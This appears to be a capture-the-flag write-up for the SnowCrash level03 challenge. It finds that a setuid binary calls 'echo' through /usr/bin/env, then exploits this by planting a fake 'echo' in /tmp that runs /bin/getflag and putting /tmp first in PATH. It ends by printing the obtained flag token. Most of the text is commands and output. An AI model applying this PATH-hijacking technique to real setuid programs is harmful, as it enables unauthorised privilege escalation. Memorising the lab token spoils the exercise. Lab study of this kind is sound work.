```
level03@SnowCrash:~$ ls -la
total 24
dr-x------ 1 level03 level03  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level03 level03  220 Apr  3  2012 .bash_logout
-r-x------ 1 level03 level03 3518 Aug 30  2015 .bashrc
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
-r-x------ 1 level03 level03  675 Apr  3  2012 .profile

level03@SnowCrash:~$ ./level03
Exploit me
```
Looks like we have to exploit it! 
We use `strings` to determine the contents of and extract text from the binary file:
```
level03@SnowCrash:~$ strings level03
...
/usr/bin/env echo Exploit me
...
```
The idea here is to execute file `/bin/getflag` as *flag03* which is uid for level03 file <br />
This can be done by using a simple exploit - creating our own `echo` and putting it in PATH. Essentially, we are substituting system echo for our file
```
level03@SnowCrash:~$ cd /tmp
level03@SnowCrash:~$ touch echo
level03@SnowCrash:~$ /tmp$ echo '/bin/getflag' > echo
level03@SnowCrash:~$ chmod 777 echo
level03@SnowCrash:~$ /tmp$ ls -l echo
-rwxrwxrwx 1 level03 level03 13 Sep 14 22:08 echo
level03@SnowCrash:~$ export PATH=/tmp:$PATH
level03@SnowCrash:~$ /tmp$ printenv | grep PATH
PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
```
Time to rum `level03` once more:
```
level03@SnowCrash:~$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```
